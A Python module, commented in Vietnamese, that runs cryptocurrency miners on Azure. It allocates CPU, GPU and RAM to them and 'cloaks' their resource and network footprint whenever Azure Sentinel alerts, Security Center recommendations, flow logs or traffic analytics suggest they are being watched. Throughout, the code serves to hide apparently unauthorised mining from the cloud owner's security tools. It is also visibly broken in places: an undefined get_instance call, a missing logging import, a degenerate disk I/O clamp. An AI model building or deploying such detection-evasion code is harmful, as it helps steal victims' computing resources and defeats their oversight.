# Module: resource_manager.py

import torch
import psutil
import pynvml
from time import sleep
from pathlib import Path
from queue import Queue, Empty
from threading import Lock, Event, Thread
from typing import List, Any, Dict

from base_manager import BaseManager  # Import BaseManager từ base_manager.py

from utils import MiningProcess

from cloak_strategies import (
    CpuCloakStrategy,
    GpuCloakStrategy,
    NetworkCloakStrategy,
    DiskIoCloakStrategy,
    CacheCloakStrategy
)
from azure_clients import (
    AzureMonitorClient,
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureSecurityCenterClient,
    AzureNetworkWatcherClient,
    AzureTrafficAnalyticsClient,
    AzureMLClient  # Thêm import AzureMLClient
)
from auxiliary_modules.cgroup_manager import assign_process_to_cgroups
import temperature_monitor
import power_management


class ResourceManager(BaseManager):
    """
    Lớp quản lý và điều chỉnh tài nguyên hệ thống, bao gồm phân phối tải động.
    Kế thừa từ BaseManager để sử dụng các phương thức chung.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], model_path: Path, logger: logging.Logger):
        super().__init__(config, model_path, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Khởi tạo các Lock cụ thể cho từng loại tài nguyên
        self.resource_lock = Lock()  # General lock for resource state

        # Danh sách tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = Lock()

        # Khởi tạo các luồng nhưng không bắt đầu
        self.monitor_thread = Thread(target=self.monitor_and_adjust, name="MonitorThread", daemon=True)
        self.optimization_thread = Thread(target=self.optimize_resources, name="OptimizationThread", daemon=True)
        self.cloaking_thread = Thread(target=self.process_cloaking_requests, name="CloakingThread", daemon=True)

        # Initialize NVML once
        try:
            pynvml.nvmlInit()
            self.gpu_initialized = True
            self.logger.info("NVML initialized successfully.")
        except pynvml.NVMLError as e:
            self.logger.error(f"Failed to initialize NVML: {e}")
            self.gpu_initialized = False

        # Hàng đợi để xử lý yêu cầu cloaking từ AnomalyDetector
        self.cloaking_request_queue = Queue()

        # Khởi tạo các client Azure
        self.azure_monitor_client = AzureMonitorClient(self.logger)
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_security_center_client = AzureSecurityCenterClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
        self.azure_ml_client = AzureMLClient(self.logger)  # Khởi tạo AzureMLClient

        # Khám phá tài nguyên Azure
        self.discover_azure_resources()

    def start(self):
        self.logger.info("Starting ResourceManager...")
        self.discover_mining_processes()
        self.monitor_thread.start()
        self.optimization_thread.start()
        self.cloaking_thread.start()
        self.logger.info("ResourceManager started successfully.")

    def stop(self):
        self.logger.info("Stopping ResourceManager...")
        self.stop_event.set()
        self.monitor_thread.join()
        self.optimization_thread.join()
        self.cloaking_thread.join()
        if self.gpu_initialized:
            try:
                pynvml.nvmlShutdown()
                self.logger.info("NVML shutdown successfully.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")
        self.logger.info("ResourceManager stopped successfully.")

    def discover_azure_resources(self):
        """
        Khám phá và lưu trữ các tài nguyên Azure cần thiết.
        """
        # Khám phá VMs
        self.vms = self.azure_monitor_client.discover_resources('Microsoft.Compute/virtualMachines')
        self.logger.info(f"Đã khám phá {len(self.vms)} Virtual Machines.")

        # Khám phá Network Watchers
        self.network_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
        self.logger.info(f"Đã khám phá {len(self.network_watchers)} Network Watchers.")

        # Khám phá NSGs
        self.nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
        self.logger.info(f"Đã khám phá {len(self.nsgs)} Network Security Groups.")

        # Khám phá các workspace Log Analytics cho Traffic Analytics
        self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.discover_resources('Microsoft.OperationalInsights/workspaces')
        self.logger.info(f"Đã khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces.")

        # Khám phá Azure ML Clusters
        self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
        self.logger.info(f"Đã khám phá {len(self.ml_clusters)} Azure ML Clusters.")

    def discover_mining_processes(self):
        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                if 'miner' in proc.info['name'].lower():
                    priority = self.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface)
                    self.mining_processes.append(mining_proc)
            self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.get('process_priority_map', {})
        return priority_map.get(process_name.lower(), 1)

    def monitor_and_adjust(self):
        monitoring_params = self.config.get("monitoring_parameters", {})
        temperature_check_interval = monitoring_params.get("temperature_monitoring_interval_seconds", 10)
        power_check_interval = monitoring_params.get("power_monitoring_interval_seconds", 10)
        azure_monitor_interval = monitoring_params.get("azure_monitor_interval_seconds", 300)  # 5 phút
        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()
                self.allocate_resources_with_priority()

                temperature_limits = self.config.get("temperature_limits", {})
                cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
                gpu_max_temp = temperature_limits.get("gpu_max_celsius", 85)

                for process in self.mining_processes:
                    self.adjust_resources_based_on_temperature(process, cpu_max_temp, gpu_max_temp)

                power_limits = self.config.get("power_limits", {})
                cpu_max_power = power_limits.get("per_device_power_watts", {}).get("cpu", 150)
                gpu_max_power = power_limits.get("per_device_power_watts", {}).get("gpu", 300)

                for process in self.mining_processes:
                    cpu_power = power_management.get_cpu_power(process.pid)
                    gpu_power = power_management.get_gpu_power(process.pid) if self.gpu_initialized else 0

                    if cpu_power > cpu_max_power:
                        self.logger.warning(f"CPU power {cpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_power}W. Điều chỉnh tài nguyên.")
                        power_management.reduce_cpu_power(process.pid)
                        self.adjust_cpu_frequency_based_load(process, psutil.cpu_percent(interval=1))
                        assign_process_to_cgroups(process.pid, {'cpu_threads': 1}, self.logger)
                        # Thêm logic bổ sung nếu cần

                    if gpu_power > gpu_max_power:
                        self.logger.warning(f"GPU power {gpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_power}W. Điều chỉnh tài nguyên.")
                        power_management.reduce_gpu_power(process.pid)
                        # Thêm logic bổ sung nếu cần

                # Thu thập dữ liệu từ Azure Monitor định kỳ
                if self.should_collect_azure_monitor_data():
                    self.collect_azure_monitor_data()

                # Các bước thu thập dữ liệu Azure khác có thể được thêm vào đây

            except Exception as e:
                self.logger.error(f"Lỗi trong quá trình giám sát và điều chỉnh: {e}")
            sleep(max(temperature_check_interval, power_check_interval))

    def should_collect_azure_monitor_data(self) -> bool:
        # Logic để xác định khi nào nên thu thập dữ liệu Azure Monitor
        # Ví dụ: sử dụng timestamp hoặc đếm số lần đã thu thập
        return True  # Hoặc điều kiện cụ thể

    def collect_azure_monitor_data(self):
        # Lấy metrics cho tất cả các VMs đã khám phá
        for vm in self.vms:
            resource_id = vm['id']
            metric_names = ['Percentage CPU', 'Available Memory Bytes']
            metrics = self.azure_monitor_client.get_metrics(resource_id, metric_names)
            self.logger.info(f"Đã thu thập metrics từ Azure Monitor cho VM {vm['name']}: {metrics}")
            # Xử lý metrics và điều chỉnh tài nguyên nếu cần thiết
            # Ví dụ: Nếu CPU sử dụng quá cao, điều chỉnh tài nguyên

    def adjust_resources_based_on_temperature(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = temperature_monitor.get_gpu_temperature(process.pid) if self.gpu_initialized else 0

            if cpu_temp > cpu_max_temp:
                self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_temp}°C. Điều chỉnh tài nguyên.")
                self.throttle_cpu(process)

            if gpu_temp > gpu_max_temp:
                self.logger.warning(f"Nhiệt độ GPU {gpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_temp}°C. Điều chỉnh tài nguyên.")
                self.adjust_gpu_usage(process)
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh tài nguyên dựa trên nhiệt độ cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def allocate_resources_with_priority(self):
        with self.resource_lock, self.mining_processes_lock:
            sorted_processes = sorted(self.mining_processes, key=lambda p: p.priority, reverse=True)
            total_cpu_cores = psutil.cpu_count(logical=True)
            allocated_cores = 0

            for process in sorted_processes:
                if allocated_cores >= total_cpu_cores:
                    self.logger.warning(f"Không còn lõi CPU để phân bổ cho tiến trình {process.name} (PID: {process.pid}).")
                    continue

                available_cores = total_cpu_cores - allocated_cores
                cores_to_allocate = min(process.priority, available_cores)
                cpu_threads = cores_to_allocate  # Giả định mỗi thread tương ứng với một lõi

                assign_process_to_cgroups(process.pid, {'cpu_threads': cpu_threads}, self.logger)
                allocated_cores += cores_to_allocate

                if self.gpu_initialized:
                    self.adjust_gpu_usage(process)

                ram_limit_mb = self.config['resource_allocation']['ram'].get('max_allocation_mb', 1024)
                self.set_ram_limit(process.pid, ram_limit_mb)

    def set_ram_limit(self, pid: int, ram_limit_mb: int):
        try:
            assign_process_to_cgroups(pid, {'memory': ram_limit_mb}, self.logger)
            self.logger.info(f"Đã thiết lập giới hạn RAM {ram_limit_mb}MB cho tiến trình PID: {pid}")
        except Exception as e:
            self.logger.error(f"Lỗi khi thiết lập giới hạn RAM cho tiến trình PID: {pid}: {e}")

    def adjust_gpu_usage(self, process: MiningProcess):
        gpu_limits = self.config.get('resource_allocation', {}).get('gpu', {})
        throttle_percentage = gpu_limits.get('throttle_percentage', 50)
        try:
            GPU_COUNT = pynvml.nvmlDeviceGetCount()
            if GPU_COUNT == 0:
                self.logger.warning("Không tìm thấy GPU nào trên hệ thống.")
                return
            gpu_index = process.pid % GPU_COUNT  # Phân phối GPU dựa trên PID
            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            current_power_limit = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            new_power_limit = int(current_power_limit * (1 - throttle_percentage / 100))
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, new_power_limit)
            self.logger.info(f"Điều chỉnh GPU {gpu_index} cho tiến trình {process.name} (PID: {process.pid}) thành {new_power_limit}W.")
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi điều chỉnh GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
        except Exception as e:
            self.logger.error(f"Lỗi không lường trước khi điều chỉnh GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def throttle_cpu(self, process: MiningProcess):
        with self.resource_lock:
            cpu_cloak = self.config['cloak_strategies'].get('cpu', {})
            throttle_percentage = cpu_cloak.get('throttle_percentage', 20)  # Mặc định giảm 20%
            freq_adjustment = cpu_cloak.get('frequency_adjustment_mhz', 2000)  # MHz

            try:
                assign_process_to_cgroups(process.pid, {'cpu_freq': freq_adjustment}, self.logger)
                self.logger.info(f"Throttled CPU frequency to {freq_adjustment}MHz ({throttle_percentage}% reduction) cho tiến trình {process.name} (PID: {process.pid}).")
            except Exception as e:
                self.logger.error(f"Lỗi khi throttling CPU cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def adjust_cpu_frequency_based_load(self, process: MiningProcess, load_percent: float):
        with self.resource_lock:
            try:
                if load_percent > 80:
                    new_freq = 2000  # MHz
                elif load_percent > 50:
                    new_freq = 2500  # MHz
                else:
                    new_freq = 3000  # MHz
                self.set_cpu_frequency(new_freq)
                self.logger.info(f"Đã điều chỉnh tần số CPU thành {new_freq} MHz cho tiến trình {process.name} (PID: {process.pid}) dựa trên tải {load_percent}%")
            except Exception as e:
                self.logger.error(f"Lỗi khi điều chỉnh tần số CPU dựa trên tải cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def set_cpu_frequency(self, freq_mhz: int):
        try:
            assign_process_to_cgroups(None, {'cpu_freq': freq_mhz}, self.logger)  # Áp dụng cho tất cả các CPU cores
            self.logger.info(f"Đã thiết lập tần số CPU thành {freq_mhz} MHz cho tất cả các lõi.")
        except Exception as e:
            self.logger.error(f"Lỗi khi thiết lập tần số CPU: {e}")

    def process_cloaking_requests(self):
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                self.cloak_resources(['cpu', 'gpu', 'network', 'disk_io', 'cache'], process)
            except Empty:
                continue  # Không có yêu cầu, tiếp tục vòng lặp
            except Exception as e:
                self.logger.error(f"Lỗi trong process_cloaking_requests: {e}")

    def cloak_resources(self, strategies: List[str], process: MiningProcess):
        try:
            for strategy in strategies:
                strategy_class = self.get_cloak_strategy_class(strategy)
                if strategy_class:
                    if strategy.lower() == 'gpu':
                        strategy_instance = strategy_class(
                            self.config['cloak_strategies'].get(strategy, {}),
                            self.logger,
                            self.gpu_initialized
                        )
                    else:
                        strategy_instance = strategy_class(
                            self.config['cloak_strategies'].get(strategy, {}),
                            self.logger
                        )
                    strategy_instance.apply(process)
                else:
                    self.logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy}")
            self.logger.info(f"Cloaking strategies executed successfully cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi thực hiện cloaking cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def get_cloak_strategy_class(self, strategy_name: str):
        strategies = {
            'cpu': CpuCloakStrategy,
            'gpu': GpuCloakStrategy,
            'network': NetworkCloakStrategy,
            'disk_io': DiskIoCloakStrategy,
            'cache': CacheCloakStrategy
            # Thêm các chiến lược khác ở đây
        }
        return strategies.get(strategy_name.lower())

    def optimize_resources(self):
        """
        Hàm tối ưu hóa tài nguyên dựa trên mô hình AI.
        """
        optimization_interval = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        process.update_resource_usage()

                self.allocate_resources_with_priority()

                # Tối ưu hóa tài nguyên dựa trên mô hình AI (phần phân phối tải động)
                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        current_state = self.collect_metrics(process)

                        input_features = self.prepare_input_features(current_state)

                        input_tensor = torch.tensor(input_features, dtype=torch.float32).to(self.device)
                        input_tensor = input_tensor.unsqueeze(0)

                        with torch.no_grad():
                            predictions = self.resource_optimization_model(input_tensor)
                            recommended_action = predictions.squeeze(0).cpu().numpy()

                        self.logger.debug(f"Hành động được mô hình AI đề xuất cho tiến trình {process.name} (PID: {process.pid}): {recommended_action}")

                        self.apply_recommended_action(recommended_action, process)

            except Exception as e:
                self.logger.error(f"Lỗi trong quá trình tối ưu hóa tài nguyên: {e}")

            sleep(optimization_interval)  # Chờ trước khi tối ưu lại

    def apply_recommended_action(self, action: List[Any], process: MiningProcess):
        with self.resource_lock:
            try:
                # Giả sử action bao gồm các chỉ số sau:
                # [cpu_threads, ram_allocation_mb, gpu_usage_percent..., disk_io_limit_mbps, network_bandwidth_limit_mbps, cache_limit_percent]
                cpu_threads = int(action[0])
                ram_allocation_mb = int(action[1])
                # Số lượng GPU usage percent phụ thuộc vào cấu hình
                gpu_usage_percent = []
                gpu_config = self.config.get("resource_allocation", {}).get("gpu", {}).get("max_usage_percent", [])
                if gpu_config:
                    gpu_usage_percent = list(action[2:2 + len(gpu_config)])
                disk_io_limit_mbps = float(action[-3])
                network_bandwidth_limit_mbps = float(action[-2])
                cache_limit_percent = float(action[-1])

                resource_dict = {}

                # Điều chỉnh CPU Threads
                current_cpu_threads = temperature_monitor.get_current_cpu_threads(process.pid)
                if cpu_threads > current_cpu_threads:
                    new_cpu_threads = current_cpu_threads + self.config["optimization_parameters"].get("cpu_thread_adjustment_step", 1)
                else:
                    new_cpu_threads = current_cpu_threads - self.config["optimization_parameters"].get("cpu_thread_adjustment_step", 1)
                new_cpu_threads = max(
                    self.config["resource_allocation"]["cpu"]["min_threads"],
                    min(new_cpu_threads, self.config["resource_allocation"]["cpu"]["max_threads"])
                )
                resource_dict['cpu_threads'] = new_cpu_threads
                self.logger.info(f"Đã điều chỉnh CPU threads thành {new_cpu_threads} cho tiến trình {process.name} (PID: {process.pid})")

                # Điều chỉnh RAM Allocation
                current_ram_allocation_mb = temperature_monitor.get_current_ram_allocation(process.pid)
                if ram_allocation_mb > current_ram_allocation_mb:
                    new_ram_allocation_mb = current_ram_allocation_mb + self.config["optimization_parameters"].get("ram_allocation_step_mb", 256)
                else:
                    new_ram_allocation_mb = ram_allocation_mb - self.config["optimization_parameters"].get("ram_allocation_step_mb", 256)
                new_ram_allocation_mb = max(
                    self.config["resource_allocation"]["ram"]["min_allocation_mb"],
                    min(new_ram_allocation_mb, self.config["resource_allocation"]["ram"]["max_allocation_mb"])
                )
                resource_dict['memory'] = new_ram_allocation_mb
                self.logger.info(f"Đã điều chỉnh RAM allocation thành {new_ram_allocation_mb}MB cho tiến trình {process.name} (PID: {process.pid})")

                # Gán các giới hạn tài nguyên vào cgroups
                assign_process_to_cgroups(process.pid, resource_dict, self.logger)

                # Điều chỉnh GPU Usage Percent
                if gpu_usage_percent:
                    current_gpu_usage_percent = temperature_monitor.get_current_gpu_usage(process.pid)
                    new_gpu_usage_percent = [
                        min(max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0), 100)
                        for gpu in gpu_usage_percent
                    ]
                    power_management.set_gpu_usage(process.pid, new_gpu_usage_percent)
                    self.logger.info(f"Đã điều chỉnh GPU usage percent thành {new_gpu_usage_percent} cho tiến trình {process.name} (PID: {process.pid})")
                else:
                    self.logger.warning(f"Không có thông tin GPU để điều chỉnh cho tiến trình {process.name} (PID: {process.pid}).")

                # Điều chỉnh Disk I/O Limit
                current_disk_io_limit_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
                if disk_io_limit_mbps > current_disk_io_limit_mbps:
                    new_disk_io_limit_mbps = current_disk_io_limit_mbps + self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
                else:
                    new_disk_io_limit_mbps = disk_io_limit_mbps - self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
                new_disk_io_limit_mbps = max(
                    self.config["resource_allocation"]["disk_io"]["limit_mbps"],
                    min(new_disk_io_limit_mbps, self.config["resource_allocation"]["disk_io"]["limit_mbps"])
                )
                resource_dict['disk_io_limit_mbps'] = new_disk_io_limit_mbps
                self.logger.info(f"Đã điều chỉnh Disk I/O limit thành {new_disk_io_limit_mbps} Mbps cho tiến trình {process.name} (PID: {process.pid})")

                # Gán lại Disk I/O Limit
                assign_process_to_cgroups(process.pid, {'disk_io_limit_mbps': new_disk_io_limit_mbps}, self.logger)

                # Điều chỉnh Network Bandwidth Limit qua Cloak Strategy
                network_cloak = self.config['cloak_strategies'].get('network', {})
                network_bandwidth_limit_mbps = network_bandwidth_limit_mbps
                network_cloak_strategy = NetworkCloakStrategy(network_cloak, self.logger)
                network_cloak_strategy.apply(process)

                # Điều chỉnh Cache Limit Percent qua Cloak Strategy
                cache_cloak = self.config['cloak_strategies'].get('cache', {})
                cache_limit_percent = cache_limit_percent
                cache_cloak_strategy = CacheCloakStrategy(cache_cloak, self.logger)
                cache_cloak_strategy.apply(process)

                self.logger.info(f"Đã áp dụng các điều chỉnh tài nguyên dựa trên mô hình AI cho tiến trình {process.name} (PID: {process.pid}).")
            except Exception as e:
                self.logger.error(f"Lỗi khi áp dụng các điều chỉnh tài nguyên cho tiến trình {process.name} (PID: {process.pid}): {e}")


class AnomalyDetector(BaseManager):
    """
    Lớp phát hiện bất thường, giám sát baseline và áp dụng cloaking khi cần thiết.
    Kế thừa từ BaseManager để sử dụng các phương thức chung.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], model_path: Path, logger: logging.Logger):
        super().__init__(config, model_path, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Danh sách tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = Lock()

        # Khởi tạo luồng phát hiện bất thường
        self.anomaly_thread = Thread(target=self.anomaly_detection, name="AnomalyDetectionThread", daemon=True)

        # Initialize NVML once
        try:
            pynvml.nvmlInit()
            self.gpu_initialized = True
            self.logger.info("NVML initialized successfully.")
        except pynvml.NVMLError as e:
            self.logger.error(f"Failed to initialize NVML: {e}")
            self.gpu_initialized = False

        # Lấy instance của ResourceManager để gửi yêu cầu cloaking
        self.resource_manager = ResourceManager.get_instance()

        # Khởi tạo các client Azure từ ResourceManager
        self.azure_sentinel_client = self.resource_manager.azure_sentinel_client
        self.azure_log_analytics_client = self.resource_manager.azure_log_analytics_client
        self.azure_security_center_client = self.resource_manager.azure_security_center_client
        self.azure_network_watcher_client = self.resource_manager.azure_network_watcher_client
        self.azure_traffic_analytics_client = self.resource_manager.azure_traffic_analytics_client
        self.azure_ml_client = self.resource_manager.azure_ml_client  # Thêm client AzureMLClient

    def start(self):
        self.logger.info("Starting AnomalyDetector...")
        self.anomaly_thread.start()
        self.logger.info("AnomalyDetector started successfully.")

    def stop(self):
        self.logger.info("Stopping AnomalyDetector...")
        self.stop_event.set()
        self.anomaly_thread.join()
        if self.gpu_initialized:
            try:
                pynvml.nvmlShutdown()
                self.logger.info("NVML shutdown successfully.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Failed to shutdown NVML: {e}")
        self.logger.info("AnomalyDetector stopped successfully.")

    def discover_mining_processes(self):
        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                if 'miner' in proc.info['name'].lower():
                    priority = self.resource_manager.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface)
                    self.mining_processes.append(mining_proc)
            self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def anomaly_detection(self):
        detection_interval = self.config.get("ai_driven_monitoring", {}).get("detection_interval_seconds", 60)
        cloak_activation_delay = self.config.get("ai_driven_monitoring", {}).get("cloak_activation_delay_seconds", 5)
        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()

                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        process.update_resource_usage()
                        current_state = self.collect_metrics(process)

                        # Thu thập dữ liệu từ Azure Sentinel
                        alerts = self.azure_sentinel_client.get_recent_alerts(days=1)
                        if alerts:
                            self.logger.warning(f"Đã phát hiện {len(alerts)} alerts từ Azure Sentinel cho tiến trình PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue  # Tiến trình này sẽ được cloaking ngay lập tức

                        # Thu thập dữ liệu từ Azure Log Analytics
                        for vm in self.resource_manager.vms:
                            query = f"Heartbeat | where Computer == '{vm['name']}' | summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
                            logs = self.azure_log_analytics_client.query_logs(query)
                            if logs:
                                # Xử lý logs và xác định bất thường
                                self.logger.warning(f"Đã phát hiện logs từ Azure Log Analytics cho VM {vm['name']}.")
                                self.resource_manager.cloaking_request_queue.put(process)
                                break  # Tiến trình này sẽ được cloaking ngay lập tức

                        # Thu thập dữ liệu từ Azure Security Center
                        recommendations = self.azure_security_center_client.get_security_recommendations()
                        if recommendations:
                            self.logger.warning(f"Đã phát hiện {len(recommendations)} security recommendations từ Azure Security Center.")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue

                        # Thu thập dữ liệu từ Azure Network Watcher
                        for nsg in self.resource_manager.nsgs:
                            flow_logs = self.azure_network_watcher_client.get_flow_logs(
                                resource_group=nsg['resourceGroup'],
                                network_watcher_name=self.resource_manager.network_watchers[0]['name'] if self.resource_manager.network_watchers else 'unknown',
                                nsg_name=nsg['name']
                            )
                            if flow_logs:
                                self.logger.warning(f"Đã phát hiện flow logs từ Azure Network Watcher cho NSG {nsg['name']}.")
                                self.resource_manager.cloaking_request_queue.put(process)
                                break

                        # Thu thập dữ liệu từ Azure Traffic Analytics (nếu cần)
                        traffic_data = self.azure_traffic_analytics_client.get_traffic_data()
                        if traffic_data:
                            self.logger.warning(f"Đã phát hiện traffic anomalies từ Azure Traffic Analytics cho tiến trình PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue

                        # Thu thập dữ liệu từ Azure ML Clusters (nếu cần)
                        for ml_cluster in self.resource_manager.ml_clusters:
                            # Implement any specific checks or data collection for ML Clusters if necessary
                            self.logger.info(f"Đang kiểm tra dữ liệu từ Azure ML Cluster: {ml_cluster['name']}")
                            # Placeholder: Thêm logic cụ thể nếu cần

                        # Tiếp tục với phân tích mô hình AI
                        input_features = self.prepare_input_features(current_state)
                        input_tensor = torch.tensor(input_features, dtype=torch.float32).to(self.device)
                        input_tensor = input_tensor.unsqueeze(0)

                        with torch.no_grad():
                            prediction = self.anomaly_cloaking_model(input_tensor)
                            anomaly_score = prediction.item()

                        self.logger.debug(f"Anomaly score cho tiến trình {process.name} (PID: {process.pid}): {anomaly_score}")

                        detection_threshold = self.config['ai_driven_monitoring']['anomaly_cloaking_model']['detection_threshold']
                        is_anomaly = anomaly_score > detection_threshold

                        if is_anomaly:
                            self.logger.warning(f"Đã phát hiện bất thường trong tiến trình {process.name} (PID: {process.pid}). Bắt đầu cloaking sau {cloak_activation_delay} giây.")
                            sleep(cloak_activation_delay)
                            self.resource_manager.cloaking_request_queue.put(process)

            except Exception as e:
                self.logger.error(f"Lỗi trong anomaly_detection: {e}")
            sleep(detection_interval)

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        current_state = {
            'cpu_percent': process.cpu_usage,
            'cpu_count': psutil.cpu_count(logical=True),
            'cpu_freq_mhz': temperature_monitor.get_cpu_freq(process.pid),
            'ram_percent': process.memory_usage,
            'ram_total_mb': psutil.virtual_memory().total / (1024 * 1024),
            'ram_available_mb': psutil.virtual_memory().available / (1024 * 1024),
            'cache_percent': temperature_monitor.get_cache_percent(),
            'gpus': [
                {
                    'gpu_percent': process.gpu_usage,
                    'memory_percent': temperature_monitor.get_gpu_memory_percent(process.pid),
                    'temperature_celsius': temperature_monitor.get_gpu_temperature(process.pid)
                }
            ],
            'disk_io_limit_mbps': process.disk_io,
            'network_bandwidth_limit_mbps': process.network_io
        }
        return current_state

    def prepare_input_features(self, current_state: Dict[str, Any]) -> List[float]:
        input_features = [
            current_state['cpu_percent'],
            current_state['cpu_count'],
            current_state['cpu_freq_mhz'],
            current_state['ram_percent'],
            current_state['ram_total_mb'],
            current_state['ram_available_mb'],
            current_state['cache_percent']
        ]

        for gpu in current_state['gpus']:
            input_features.extend([
                gpu['gpu_percent'],
                gpu['memory_percent'],
                gpu['temperature_celsius']
            ])

        input_features.extend([
            current_state['disk_io_limit_mbps'],
            current_state['network_bandwidth_limit_mbps']
        ])

        return input_features
